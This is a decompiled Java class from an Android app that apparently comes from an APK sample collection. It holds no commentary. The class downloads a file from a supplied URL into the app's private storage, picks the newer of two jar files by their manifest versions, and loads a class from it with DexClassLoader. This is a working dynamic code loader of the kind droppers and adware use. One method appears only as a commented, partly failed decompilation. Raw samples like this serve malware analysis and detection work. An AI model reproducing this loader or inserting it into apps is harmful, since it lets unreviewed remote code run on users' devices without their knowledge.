package com.asshow.asshow.b;

import android.content.Context;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
/* loaded from: /mnt/shared/apks/menSe7ni.dex */
public final class e {

    /* renamed from: a  reason: collision with root package name */
    private static final String f403a = com.asshow.asshow.a.a.f395a;
    private static ClassLoader b = null;
    private static boolean c = false;
    private static String d = "";

    /* JADX INFO: Access modifiers changed from: package-private */
    public static Class a(Context context) {
        ClassLoader b2 = b(context);
        if (!d.equals("")) {
            return b2.loadClass(d);
        }
        return null;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static /* synthetic */ void a(Context context, String str, String str2) {
        String str3 = str2 + ".tm";
        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
        httpURLConnection.setConnectTimeout(40000);
        httpURLConnection.setReadTimeout(60000);
        httpURLConnection.connect();
        BufferedInputStream bufferedInputStream = new BufferedInputStream(httpURLConnection.getInputStream());
        BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(context.openFileOutput(str3, 0));
        File filesDir = context.getFilesDir();
        File file = new File(filesDir + File.separator + str3);
        File file2 = new File(filesDir + File.separator + str2);
        byte[] bArr = new byte[5120];
        while (true) {
            int read = bufferedInputStream.read(bArr);
            if (read <= 0) {
                break;
            }
            bufferedOutputStream.write(bArr, 0, read);
        }
        bufferedOutputStream.flush();
        bufferedInputStream.close();
        bufferedOutputStream.close();
        if (file.exists()) {
            a(context, file.toURI().toURL(), file2.getName());
        }
    }

    private static boolean a(Context context, URL url, String str) {
        String str2 = com.asshow.asshow.a.b.d;
        return d.a(context, url, str, str2, str2);
    }

    /* JADX WARN: Removed duplicated region for block: B:18:0x0092 A[Catch: Exception -> 0x00ff, all -> 0x0103, TryCatch #0 {Exception -> 0x00ff, blocks: (B:16:0x008c, B:18:0x0092, B:19:0x00a9, B:21:0x00c9, B:22:0x00cf), top: B:15:0x008c }] */
    /* JADX WARN: Removed duplicated region for block: B:21:0x00c9 A[Catch: Exception -> 0x00ff, all -> 0x0103, TryCatch #0 {Exception -> 0x00ff, blocks: (B:16:0x008c, B:18:0x0092, B:19:0x00a9, B:21:0x00c9, B:22:0x00cf), top: B:15:0x008c }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private static synchronized java.lang.ClassLoader b(android.content.Context r10) {
        /*
            java.lang.Class<com.asshow.asshow.b.e> r0 = com.asshow.asshow.b.e.class
            monitor-enter(r0)
            c(r10)     // Catch: java.lang.Throwable -> L103
            java.lang.ClassLoader r1 = com.asshow.asshow.b.e.b     // Catch: java.lang.Throwable -> L103
            if (r1 == 0) goto Lc
            monitor-exit(r0)
            return r1
        Lc:
            java.io.File r1 = new java.io.File     // Catch: java.lang.Throwable -> L103
            java.lang.StringBuilder r2 = new java.lang.StringBuilder     // Catch: java.lang.Throwable -> L103
            r2.<init>()     // Catch: java.lang.Throwable -> L103
            java.io.File r3 = r10.getFilesDir()     // Catch: java.lang.Throwable -> L103
            java.lang.String r3 = r3.getAbsolutePath()     // Catch: java.lang.Throwable -> L103
            java.lang.StringBuilder r2 = r2.append(r3)     // Catch: java.lang.Throwable -> L103
            java.lang.String r3 = "/"
            java.lang.StringBuilder r2 = r2.append(r3)     // Catch: java.lang.Throwable -> L103
            java.lang.String r3 = com.asshow.asshow.a.b.b     // Catch: java.lang.Throwable -> L103
            java.lang.StringBuilder r2 = r2.append(r3)     // Catch: java.lang.Throwable -> L103
            java.lang.String r2 = r2.toString()     // Catch: java.lang.Throwable -> L103
            r1.<init>(r2)     // Catch: java.lang.Throwable -> L103
            java.io.File r2 = new java.io.File     // Catch: java.lang.Throwable -> L103
            java.lang.StringBuilder r3 = new java.lang.StringBuilder     // Catch: java.lang.Throwable -> L103
            r3.<init>()     // Catch: java.lang.Throwable -> L103
            java.io.File r4 = r10.getFilesDir()     // Catch: java.lang.Throwable -> L103
            java.lang.String r4 = r4.getAbsolutePath()     // Catch: java.lang.Throwable -> L103
            java.lang.StringBuilder r3 = r3.append(r4)     // Catch: java.lang.Throwable -> L103
            java.lang.String r4 = "/"
            java.lang.StringBuilder r3 = r3.append(r4)     // Catch: java.lang.Throwable -> L103
            java.lang.String r4 = com.asshow.asshow.a.b.n     // Catch: java.lang.Throwable -> L103
            java.lang.StringBuilder r3 = r3.append(r4)     // Catch: java.lang.Throwable -> L103
            java.lang.String r3 = r3.toString()     // Catch: java.lang.Throwable -> L103
            r2.<init>(r3)     // Catch: java.lang.Throwable -> L103
            r3 = 0
            boolean r5 = r2.exists()     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            if (r5 == 0) goto L78
            java.util.jar.JarFile r5 = new java.util.jar.JarFile     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            r5.<init>(r2)     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            java.util.jar.Manifest r5 = r5.getManifest()     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            java.util.jar.Attributes r5 = r5.getMainAttributes()     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            java.lang.String r6 = "v"
            java.lang.String r5 = r5.getValue(r6)     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            double r5 = java.lang.Double.parseDouble(r5)     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            goto L8c
        L78:
            java.lang.String r5 = com.asshow.asshow.a.b.c     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            java.net.URL r6 = r0.getResource(r5)     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            if (r6 == 0) goto L8b
            java.net.URL r5 = r0.getResource(r5)     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            java.lang.String r6 = r2.getName()     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
            a(r10, r5, r6)     // Catch: java.lang.Exception -> L8b java.lang.Throwable -> L103
        L8b:
            r5 = r3
        L8c:
            boolean r7 = r1.exists()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            if (r7 == 0) goto La9
            java.util.jar.JarFile r3 = new java.util.jar.JarFile     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            r3.<init>(r1)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.util.jar.Manifest r3 = r3.getManifest()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.util.jar.Attributes r3 = r3.getMainAttributes()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.lang.String r4 = "v"
            java.lang.String r3 = r3.getValue(r4)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            double r3 = java.lang.Double.parseDouble(r3)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
        La9:
            java.lang.String r7 = com.asshow.asshow.b.e.f403a     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.lang.StringBuilder r8 = new java.lang.StringBuilder     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            r8.<init>()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.lang.StringBuilder r8 = r8.append(r5)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.lang.String r9 = ";"
            java.lang.StringBuilder r8 = r8.append(r9)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.lang.StringBuilder r8 = r8.append(r3)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.lang.String r8 = r8.toString()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            android.util.Log.e(r7, r8)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            int r7 = (r5 > r3 ? 1 : (r5 == r3 ? 0 : -1))
            if (r7 <= 0) goto Lcf
            r1.delete()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            r2.renameTo(r1)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
        Lcf:
            java.util.jar.JarFile r2 = new java.util.jar.JarFile     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            r2.<init>(r1)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.util.jar.Manifest r3 = r2.getManifest()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.util.jar.Attributes r3 = r3.getMainAttributes()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.lang.String r4 = "i"
            java.lang.String r3 = r3.getValue(r4)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            com.asshow.asshow.b.e.d = r3     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            r2.close()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            dalvik.system.DexClassLoader r2 = new dalvik.system.DexClassLoader     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.lang.String r1 = r1.getAbsolutePath()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.io.File r3 = r10.getFilesDir()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            java.lang.String r3 = r3.getAbsolutePath()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            r4 = 0
            java.lang.ClassLoader r10 = r10.getClassLoader()     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            r2.<init>(r1, r3, r4, r10)     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
            com.asshow.asshow.b.e.b = r2     // Catch: java.lang.Exception -> Lff java.lang.Throwable -> L103
        Lff:
            java.lang.ClassLoader r10 = com.asshow.asshow.b.e.b     // Catch: java.lang.Throwable -> L103
            monitor-exit(r0)
            return r10
        L103:
            r10 = move-exception
            monitor-exit(r0)
            throw r10
        */
        throw new UnsupportedOperationException("Method not decompiled: com.asshow.asshow.b.e.b(android.content.Context):java.lang.ClassLoader");
    }

    private static synchronized void c(Context context) {
        synchronized (e.class) {
            if (c) {
                return;
            }
            c = true;
            new f(new File(context.getFilesDir().getAbsolutePath() + "/" + com.asshow.asshow.a.b.b), context).start();
        }
    }
}
